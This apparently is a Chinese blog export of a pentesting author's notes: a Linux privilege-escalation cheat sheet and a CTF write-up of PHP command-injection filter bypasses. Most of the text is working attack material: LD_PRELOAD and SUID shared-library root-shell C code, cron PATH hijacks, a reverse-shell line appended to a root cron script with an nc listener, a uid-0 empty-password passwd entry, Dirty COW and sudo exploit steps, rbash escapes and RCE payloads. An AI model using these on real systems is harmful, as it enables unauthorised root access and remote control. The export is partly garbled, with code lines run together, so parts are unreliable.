&gt;1.txt\n\n将有hash的用户提取出来，并对hash密文进行爆破\n**$6$**是SHA-512加密的\n1sudo john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt\n\n获得明文密码进行登录\n可写1234cp /etc/shadow /tmp/shadow.bak #进行备份#将密码替换成我们自己的mkpasswd -m sha-512 Sygsdsg #-m 指定加密模式 将生成的密文进行替换#冒号之间进行替换\n\nshadow文件生成密码使用mkpasswd\n可写passwd文件利用提权1234ls -liah /etc/passwd #查看权限cp /etc/passwd /tmp/passwd.bak #备份openssl passwd Sygsdsg #将生成的密文进行替换xip #确定靶机\n\npasswds生成密码使用的是openssl\nsudo环境变量提权 （sudo -l）123sudo -l#前提env_keep+=LD_PRELOAD 可以加载动态共享库vim shell.c\n\n1234567891011#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void init() &#123;    unsetenv(&quot;LD_PRELOAD&quot;); // Remove any LD_PRELOAD environment variable.    setgid(0);               // Set the group ID to root (0).    setuid(0);               // Set the user ID to root (0).    system(&quot;/bin/bash&quot;);     // Execute a bash shell.&#125;\n\n1gcc -fPIC -shared -o shell.so shell.c -nostartfiles #编译文件\n\n\ngcc: GNU C 编译器的命令。\n-fPIC: 生成位置无关代码（Position Independent Code），这是创建共享库的必要选项。\n-shared: 指示编译器生成共享库，而不是可执行文件。\n-o shell.so: 指定输出文件的名称为 shell.so。\nshell.c: 输入的 C 源文件。\n-nostartfiles: 不链接标准启动文件。这在编译共享库时可能会用到，尤其是当你不需要标准的 C 库初始化时。\n\n会编译出一个 shell.so文件，到此，提权的脚本准备完毕，现在需要使用一个高权限用户的任意一个命令来一个执行脚本，可以知道，sudo -l 有时还会显示如下图\n\n12sudo LD_PRELOAD=/home/user/shell.so find#通过使用root的find命令，在命令执行之前预先加载我们脚本中的库\n\ncrontab文件权限提权修改文件内容12cat /etc/crontablocate xx.sh #查看目标定时任务路径\n\n查看是否有高权限用户留下定时任务，再查看定时任务有没有可写权限，如果满足，直接写入反弹shell的命令\n12echo &quot;bash -i &gt;&amp;/dev/tcp/192.168.38.130/8888 0&gt;&amp;1&quot; &gt;&gt; xx.sh #xx.sh是目标定时任务 靶机rlwrap nc -lvnp 8888#kali\n\n等待反弹shell\n修改文件路径前提，指定定时任务时不是绝对路径，如第一条\n12* * * * * root overwrite.sh* * * * * root /usr/local/bin/compress.sh\n\n12345cat /etc/crontab #会看到指定的路径PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin #locate overwrite.sh\n\n若为指定路径，在执行定时任务时，会通过PATH靠前的路径寻找执行文件，可以看见第一个路径是**&#x2F;home&#x2F;user**\n12cd /home/uservi overwrite.sh #内容如下\n\n123#!/bin/bashcp /bin/bash /tmp/rootbash chmod +xs /tmp/rootbash\n\n12chmod +x overwrite.sh #等待定时任务设定时间/tmp/rootbash -p\n\n自动任务tar 的 checkpoint123456789cat  /etc/crontab#看到这个* * * * * root /usr/local/bin/compress.shcat /usr/local/bin/compress.sh 显示#!/bin/bash cd /home/user #定时任务是这个目录执行命令tar czf /tmp/backup.tar.gz #进行备份压缩文件，这是一种很常规的服务器配置命令，这里使用的tar中有checkpointtar --help #可以看到checkpoint--checkpoint-action=ACTION execute ACTION on each checkpoint #选项使用户可以定义在进程达到检查点时应该执行的操作\n\n可以知道我们进入目标目录手动添加检查点来执行脚本\n123cd /home/user touch /home/user/--checkpoint=1touch /home/user/--checkpoint-action=exec=shell.sh\n\nshell.sh可看上文的shell脚本\n等待定时任务进行\nSUID提权可利用脚本进行提权123find / -user root -perm -4000 -print 2&gt;/dev/nullfind/-perm-u=s -type f 2&gt;/dev/nullfind/-userroot-perm-4000-exec ls - 1s -1db &#123;&#125; \\;\n\nhttps://www.freebuf.com/vuls/262592.html\nhttps://www.cnblogs.com/liang-chen/p/14367408.html\n\n找查什么文件不重要（但是是存在的文件),只需要格式对，然后后面加上\nfindeg:\n1find / -name index.php -exec &quot;/bin/sh&quot; \\;\n\nexim本机给反弹shell传脚本&#96;\n1234567891011/usr/sbin/exim4 --version #查看版本searchsploit exim 4#下载提权脚本#传输提权脚本在/tmp目录下php -S localhost:8000python -m http.server 8000#开启网站之后，在靶机shell中获取wget -O myfile.txt http://example.com/file.txtcurl http://example.com/file.txt -o myfile.txt执行脚本chmod 777 xxx.sh\n\n共享库注入提权123find/-perm-u=s -type f 2&gt;/dev/null #查找可执行文件#/usr/localbin/suid-so #利用这个文件\n\n先执行这个文件\n123456strings /usr/localbin/suid-so #调试和分析共享库strace /usr/localbin/suid-so 2&gt;&amp;1 # 追踪且输出错误信息strace /usr/localbin/suid-so 2&gt;&amp;1 | grep &#x27;/home&#x27; # 仅显示home的有关信息#报出open(&quot;/home/user/.config/libcalc.so&quot;, O_FRDONLY) = -1 ENOENT (No such file or directory)#这意味着系统尝试打开指定路径下的文件 libcalc.so 但失败了\n\n这样我们就可以自己编辑libcalc.so，直接编辑成我们的提权脚本\n123mkdir .config # 新建文件夹cd .config # 切换到.config目录下vim libcalc.c # 因为目标文件是共享库，故需要先写代码，再编译成共享库文件 \n\n123456789101112131415//libcalc.c内容#include &lt;stdio.h&gt; //标准输入输出库#include &lt;stdlib.h&gt; //C语言标准库#include &lt;unistd.h&gt; //包含setuid和setgid的库//static表示该函数为静态函数，仅在当前文件中可见；//__attribute__((constructor))：gcc特有，用于指定函数再程序加载时被自动调用。当程序启动时，编译器会在所有普通的全局和静态变量初始化之后，再main函数执行之前调用这个被标记的函数。static void inject() __attribute__((constructor));void inject()&#123;\tsetgid(0);\tsetuid(0);\tsystem(&quot;/bin/bash -p&quot;); //-p:以root身份启动shell&#125;\n\n12gcc -shared -fPIC -o libcalc.so libcalc.c # 编译usr/local/bin/suid-so #再次执行时，即可提权成功\n\n环境变量利用提权1find/-perm-u=s -type f 2&gt;/dev/null\n\n这里关注/usr/localbin/suid-env文件，执行程序，并用strings查看程序中出现的可打印字符\n1strings /usr/localbin/suid-env \n\n#看到\n\n这里用service命令启动apache服务，service apache2 start。因为这里的service用的是相对路径，而相对路径就与环境变量中的PATH有关，当试图启动apache服务时，系统会去PATH里，按照路径的先后顺序依此寻找service脚本。这里就可以通过更改环境变量中的PATH实现提权。\n1vim service.c\n\n123456789#include &lt;stdio.h&gt; //标准输入输出库#include &lt;stdlib.h&gt; //C语言标准库#include &lt;unistd.h&gt; //包含setuid和setgid的库void main()&#123;\tsetgid(0);\tsetuid(0);\tsystem(&quot;/bin/bash -p&quot;); //-p:以root身份启动shell&#125;\n\n1gcc -o service service.c\n\n123echo $PATH # 查看当前$PATH变量export PATH=.:$PATH # 将当前路径加入到$PATH中/usr/localbin/suid-env #再次执行，进行提权\n\n\n\n巧用SUID-shell功能提权#1巧用SUID-shell功能提权#2密码和密钥历史文件提权密码和密钥配置文件查看提权SSH密钥敏感信息提权NFS提权内核利用提权doas less+vi提权利用MOTD机制提权可预测PRNG暴力破解SSH提权内核漏洞提权查看发行版本\n123cat /etc/issue cat/etc/*-releaseuname-a\n\n这样我们就得到了系统的内核版本可以用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码,也可以直接去网上搜索\nsearchsploit linux Debian 查看内核漏洞poc\nsearchsploit -p 19256 查看漏洞poc相关内容  or  github搜索提权\n脏牛提权1.先在&#x2F;tmp目录上传(rz)脏牛文件， ps:&#x2F;tmp任意用户都有操作权限\n2.编译脏牛文件 gcc -pthread dirty.c -o dirty -lcrypt\n\n3.执行文件   ./dirty   \nsudo提权2021年1月26日,Sudo发布安全通告,修复了一个类Unix操作系系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时,它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时,实际上并未进行转义,从而可能导致缓冲区溢出。因此只要存在sudoers文件(通常是&#x2F;etc&#x2F;sudoers),攻击者就可以使用本地普通用户利用sudo获得系统root权限。目前漏洞细节已公开,请受影响的用户尽快采取措施进行防护。相关文章:Linux中su和sudo的用法和区别https://xie1997.blog.csdn.net/article/details/99710793\n1234漏洞影响版本Sudo 1.8.2 - 1.8.31p2Sudo 1.9.0 - 1.9.5p1不受影响版本:sudo=&gt;1.9.5p2\n\nsudo --version 查看sudo版本\nsudo -l``sudo -l 命令用于列出当前用户可以执行的 sudo 命令和相关权限\n检测是否存在漏洞,使用普通用户执行下面的命令sudoedit -s /\n若返回如图以”sudoedit:”开头的错误,则当前系统可能存在安全风险不受影响的系统将显示以”usage:”开头的错误\npoc下载地址 https://github.com/blasty/CVE-2021-3156\n进入下载目录 make编译安装\ngit提权12345sudo git help config\t!/bin/bash或者！&#x27;sh&#x27;完成提权 sudo git  -p help\t!/bin/bash\n\n\n-exec “&#x2F;bin&#x2F;sh” ; \nrbash如何设置rbash12useradd -s /bin/rbash test # 设置用户test登陆的shell为rbashmkdir -p /home/test/.bin # 在test用户下新建一个.bin目录存放可以执行的命令\n\n会限制一些行为，让一些命令无法执行\nrbash逃逸做信息收集枚举环境变量\n查看当前的环境变量设置。特别是**PATH和SHELL变量**，它们可能影响到命令的查找和执行\n123456declare -xtypeset -xexportenvprintenvecho $PATH\n\n检查关于rbash逃逸可用应用和服务文本编辑器：如vi、vim、nano等，这些编辑器有时候允许用户执行系统命令。\n其他系统工具：如ftp，more，less，man等，这些工具在特定情况下也可用于执行命令逃逸\n调试工具：如gdb，在某些配置下可能允许用户执行任意代码\n枚举可用的命令和操作符命令枚举：检查哪些命令在rbash环境中是可用的。这通常包括一些基本的文件操作命令（如ls、cat、echo等），以及可能未被禁用的系统命令。\n操作符枚举：尝试使用重定向操作符（如&gt;、&gt;&gt;、&lt;等）和管道操作符（|），以评估它们是否可用。这些操作符在构建逃逸命令时可能非常有用。\n检查可用编程语言1python  perl  ruby  php  java等\n\n用户和sudo权限\n用户权限：了解当前用户的权限范围，包括可以访问哪些文件和目录。\nsudo权限：使用sudo -l命令查看当前用户是否有sudo权限以及可以执行哪些命令。这有助于评估是否可以通过sudo命令绕过rbash限制。\n\n1.“&#x2F;”字符被允许了txt如果/被允许我们可以直接运行：/bin/bash2.cp命令被允许12345#可以直接复制/bin/bash到本地用户目录cp /bin/bash test1cp /bin/sh test2./test1 # 切换到了/bin/bash./test2 # 切换到了/bin/sh\n\n3.常见工具探测系统中是否存在常见工具\nman git12man &gt; !/bin/shgit &gt; git help status\n\nFTP，GDB12ftp &gt; !/bin/shgdb &gt; !/bin/sh\n\nvi&#x2F;vim12vim test!/bin/sh # 利用在vi/vim中可以执行命令的特点\n\ned-editor12ed!&#x27;/bin/sh&#x27;\n\nfind12find / -name SomeName -exec /bin/sh \\;find / -name SomeName -exec /bin/bash \\;\n\nmore&#x2F;less12more test!/bin/sh # 同样也是利用打开文件后可以在下面运行命令的特\n\n4.set shell在一些编辑器中可以设置shell变量然后执行，如vim中\n123456#vim/vi进入之后set shell=/bin/sh # 或者用/bin/bashshell#切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/\n\n5.更改PATH或SHELL环境变量1234export -p # 查看系统的环境变量设置 PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入export PATH=$PATH:/bin/:/usr/bin:$PATHexport SHELL=/bin/sh\n\n6.编程语言语言可以帮助我们切换shell的类型\n(1) python12python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;\n\n(2) php1php -a then exec(&quot;sh -i&quot;)\n\n(3) perl1perl -e &quot;exec &#x27;/bin/sh&#x27;;&quot;\n\n(4) lua1os.execute(&#x27;/bin/sh&#x27;)\n\n(5) ruby1exec &quot;/bin/sh&quot;\n\n7.其他可以尝试的方法ssh1234ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;ssh username@IP -t &quot;bash --noprofile&quot;ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (sehllshock)ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)\n\nzip1zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;\n\ntar1tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\nawk**(超级玛丽靶机使用它成功了)**1awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; \n\n8.切换用户时逃逸这里的原理涉及到su 和 su- 的区别：\nsu命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的\nsu- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为&#x2F;root&#x2F;，环境变量也变\n123su -l twsu - twsu --login tw\n\n9.另类方法(DC-2靶机使用它成功了)12345# 利用bash_cmds自定义一个shellBASH_CMDS[cat]=/bin/sh;cat# 添加环境变量export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin\n\nTeeheeteehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权\n核心思路就是利用其在passwd文件中追加一条uid为0的用户条目\n1echo &quot;sygsdsg::0:0:sygsdsg:/root:/bin/bash&quot; | sudo teehee -a /etc/passwd\n\n这条命令的作用是将 &quot;raaj::0:0:::/bin/bash&quot; 这行文本追加到 /etc/passwd 文件中，类似于\n12echo &quot;sygsdsg::0:0:sygsdsg:/root:/bin/bash&quot; &gt; temp.txtsudo teehee -a /etc/passwd &lt; temp.txt\n\n按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。这个用户因为uid为0，所以也是root权限\n\n补充\n\n/etc/passwd 文件：包含用户的基本信息，比如用户名、用户ID（UID）、组ID（GID）和默认shell等。\n\n/etc/shadow 文件：存储用户的密码和相关的安全信息。\n没有 shadow 条目：如果某个用户在 /etc/shadow 中没有相应的条目，这意味着该用户没有设置密码或其密码是空的。\n密码条目为空：如果 /etc/passwd 中该用户的密码字段为空，且没有相应的 shadow 条目，表示可以使用空密码登录。\n\n\n\ncrontab提权前置知识\nhttps://www.runoob.com/w3cnote/linux-crontab-tasks.html\n","slug":"提权","date":"2024-10-22T11:03:03.000Z","categories_index":"渗透","tags_index":"内网渗透","author_index":"Sygsdsg"},{"id":"15453c383c32a99612ffdb75790c3ef8","title":"rce","content":"命令执行相对地址 &#x2F;flag.php 绝对地址**&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php**\n1.复制文本内容Web30​    url&#x2F;?c&#x3D;echo cp fl\\*g.p\\*p 1.txt; 将flag.php的内容复制到1.txt中\n​    url&#x2F;?c&#x3D;echo mv fl\\*g.p\\*p 1.txt;\n​    访问url&#x2F;1.txt 获取文本内容\n2.嵌套命令执行Web31l url&#x2F;?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘cat flag.php’);  ‘1’参数逃逸出去不受过滤限制\nWeb32l url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;fla\ng.php       ps:用include逃逸参数 要搭配文件读取使用\nurl&#x2F;?c&#x3D;require%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php ;分号被过滤 可替换成?&gt;\n3.文件包含命令执行Web37​    出现include($c) include($c.php)或代码即可用文件包含 使用data伪协议\nurl&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,\nweb38url&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 短标签\n4.无参数RCEWeb40url&#x2F;?c&#x3D;print_r(get_defined_vars()); 获取并打印当前作用域中所有已定义的变量的数组\n即可自定义一个变sy量 eg:1&#x3D;phpinfo(); \n​                               \nurl&#x2F;?c&#x3D;print_r(next(get_defined_vars()));\n**next()** 是 PHP 中用于将数组中的内部指针向前移动并返回当前元素的函数\nurl&#x2F;?c&#x3D;print_r(array_pop(next(get_defined_vars()))); 弹出数组值\nurl&#x2F;?c&#x3D;eval(array_pop(next(get_defined_vars()))); 执行命令 \n \n5. shell 重定向操作Web42&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 命令的标准输出（stdout）和标准错误（stderr）都被重定向到 &#x2F;dev&#x2F;null 即可双写绕过\nurl&#x2F;?c&#x3D;cat flag.php;ls\nweb43 过滤分号\nurl&#x2F;?c&#x3D;cat flag.php&amp;&amp;ls\nweb45 过滤空格\nurl&#x2F;?c&#x3D;tac%09fl*.php%26%26ls\n6.Web50​    nl&lt;flag.php||ls 这种方式不支持* ？通配符\n​    nl&lt;fla’’g.php||ls  shell特性 用 ‘’ 分隔，命令执行时会自动忽略\n7. web52 cp$IFSfl?g.ph?$IFSa.txt||ls\n cp${IFS}fl?g.ph?${IFS}a.txt||ls\n cp${IFS}&#x2F;fl?g${IFS}b.txt||ls\n8.web55?c&#x3D;&#x2F;???&#x2F;????64 ????.???\n?c&#x3D;&#x2F;bin&#x2F;base64 flag.php\n?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????.???\n?c&#x3D;&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php\n最后访问**&#x2F;flag.php.bz2**即可\n下载下来的压缩包中包含有flag.php\n9.web56​    自定义脚本 上传服务器进行命令执行\n​    自己搭建一个文件上传页面 要指定好目标url \n  \n临时文件存放目录命名规则 eg:&#x2F;tmp&#x2F;phpaaaaaX  php+五位小写字母+一位大写字母\n使用通配符 &#x2F;???&#x2F;????????[@-[]   ascii值 @ 到 [ 之间为大写字母\n在文件上传页面上传并抓包\n修改数据包内容为命令操控脚本 一般上传txt\n   \n  \n响应如下 即可正常rce   \n\n10.web58 文件读取echo file_get_contents(‘flag.php’);\nhighlight_file(‘flag.php’);\nshow_source(‘flag.php’);\ninclude_file(‘flag.php’);echo $flag;\ninclude(‘flag.php’);var_dump(get_defined_vars());\n11.web 66Flag换位置 使用var_dump(scandir(‘&#x2F;‘)); var_export(scandir(‘&#x2F;‘));**\n ..&#x2F; 上一级目录 \n. 当前目录 &#x2F; 根目录\ninclude(‘&#x2F;flag.txt’);\n12.web 71\n \n将flag转换成？\n \n 此时在命令后添加一个 exit(); 中断下列命令即可\ninclude(‘&#x2F;flag.txt’);exit();\ninclude(‘&#x2F;flag.txt’);ob_flush();\ninclude(‘&#x2F;flag.txt’); ob_end_flush();\ninclude(‘&#x2F;flag.txt’);die();\nc&#x3D;$a&#x3D;”glob:&#x2F;&#x2F;&#x2F;*.txt”;\n13.web72glob可以遍历目录，并且不受disable_functions的限制。\n​    构造c&#x3D;?&gt;__toString().' ');} exit(0); ?>\n其实就是执行了一个php语句。首先glob查找根目录下的所有目录（glob:&#x2F;&#x2F; &#x2F;*这样更加清楚些）。然后循环执行并输出给$f，在输出$f。\n​            \n14.web73 通过连接数据库读取c&#x3D;\ntry {$dbh &#x3D; new PDO(‘mysql:host&#x3D;localhost;dbname&#x3D;ctftraining’, ‘root’,’root’);foreach($dbh-&gt;query(‘select load_file(“&#x2F;flag36.txt”)’) as $row){echo($row[0]).”|”; }$dbh &#x3D; null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);\n数据库名ctftraining 在web58通过蚁剑连接可以获取\n此方法搭配72关遍历目录使用\n15.web77 FFI 即外部函数接口外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术\n1**c=$ffi = FFI::cdef(&quot;int system(const char \\*command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);**\n\n$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象\n$a&#x3D;’&#x2F;readflag &gt; 1.txt’;&#x2F;&#x2F;没有回显，所以将内容输出到1.txt\n$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数\n再访问1.txt\n16.通过系统变量来构造命令web118思路一\n$&#123;PWD&#125; 表示当前工作目录的路径\n$&#123;PATH&#125; 是一个环境变量\n通常包含/bin、/usr/bin、/sbin、/usr/sbin 等目录\n可以发现这几个目录的最后一个字母都是n\n接下来再看看怎么通过系统变量来获取字母\necho ${PWD}&#x2F;rootecho ${PWD:0:1} #表示从0下标开始的第一个字符&#x2F;echo ${PWD:0:1} #从结尾开始往前的第一个字符techo ${PWD:0}techo ${PWD:~A} #所以字母和0具有同样作用t\n通过提示可得当前目录是&#x2F;var&#x2F;www&#x2F;html\n可以构造nl命令\npayload: nl 如下是环境变量构造 空格**$IFS**代替 flag.php用 **????.???**代替\n${PATH:0}${PWD:0}$IFS????.???\n看源代码即可\n17.通过进程累加器来获取字符构造命令web119构造 &#x2F;bin&#x2F;cat xxxx.xxx\nSHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}&#x3D;1，然后在此shell中再打开一个shell时${SHLVL}&#x3D;2。\n$:${SHLVL}}就输出&#x2F;\n汇总一下每个数字的代替方式\n0：**$、$:$:$}\nr   ${PWD:$}\npayload:\n&#x2F;???&#x2F;??v ????.???\n${PWD::$}???${PWD::$}??${PWD:$:$} ????.???\n&#x2F;???&#x2F;r? ????.???\n${PWD::$}???${PWD::$}${PWD:$}?? ????.???\n19.web122构造  &#x2F;bin&#x2F;base64 xxxx.xx\n以base64的形式来输出文件\n${HOME}&#x3D;&#x2F;root\n&#x2F;   ${HOME::$?}   **$?与&lt;A;**搭配使用\n6   ${RANDOM::$?} 这里使用随机数来碰撞出数字6\n&lt;A; 返回的错误值 使得 $? 为1\npayload:\n&#x2F;???&#x2F;????6? ????.???\n&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.???\n20.web124\n1234&lt;?php$hexadecimal = &#x27;a37334&#x27;;echo base_convert($hexadecimal, 16, 2);?&gt;\n\n1输出：101000110111001100110100\n\n\n12345&lt;?phpecho bindec(&#x27;110011&#x27;) . &quot;\\n&quot;;echo bindec(&#x27;000110011&#x27;) . &quot;\\n&quot;;echo bindec(&#x27;111&#x27;);?&gt;\n\n以上示例会输出：\n12351517\n\n\n1234&lt;?phpecho decbin(12) . &quot;\\n&quot;;echo decbin(26);?&gt;\n\n以上示例会输出：\n12110011010\n\n\n\n动态函数调用要使用 $var&#123;func&#125; 这种形式\n $var 是一个字符串，&#123;func&#125; 表示函数名\n如果直接使用 $func，则 PHP 引擎会将其解释为一个未定义的常量，并不会当成代码来执行\n&#96;&#96;&lt;?php&#96; \necho (&#39;system&#39;)(&#39;dir&#39;);\n?&gt;\n输出页面\n\n\n在web124中，我们要在可用函数中通过数字的进制转换来构造字符串\n最先想到的便是hex2bin因为他最终可以返回ascii值来构造字符串\n但是hex2bin被禁用便可以通过base_convert来构造\n通过实验逆向构造\n1base_convert(&#x27;hex2bin&#x27;,36,10)\t→\t37907361743\n\n可得第一部分目标代码\n1base_convert(&#x27;37907361743&#x27;,10,36)\n\n通过php动态函数调用，我们最终要构造\n(‘hex2bin’)(‘hex字符串’) 来构造出 ‘_GET‘\n第一部分已经完成，接下来构造第二部分\n题目中字母也被禁用\n文本转16进制再转10进制得\n1_GET → 5f474554 → 1598506324\n\n可得第二部分目标代码\n1dechex(1598506324)\n\n(‘hex2bin’)(‘hex字符串’)两部分替换后得\nbase_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))      _GET\n再通过动态函数调用构造二次传参\n?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));  动态函数调用部分\n$$pi &#x3D; $_GET   即可构造二次传参 并且 [] 让 ban 了替换成 {} 即可\n$$pi{abs}($$a{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls;  构造二次传参部分  \n其中**$$pi{abs};是$var{func}中的$var，$$pi{acos};是$var{func}中的{func}**\n最终payload:\n?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls; \n选pi是因为他是在白名单中最短的 方便绕过长度限制\n","slug":"rce","date":"2024-10-22T05:28:00.000Z","categories_index":"ctf入门","tags_index":"php","author_index":"Sygsdsg"}]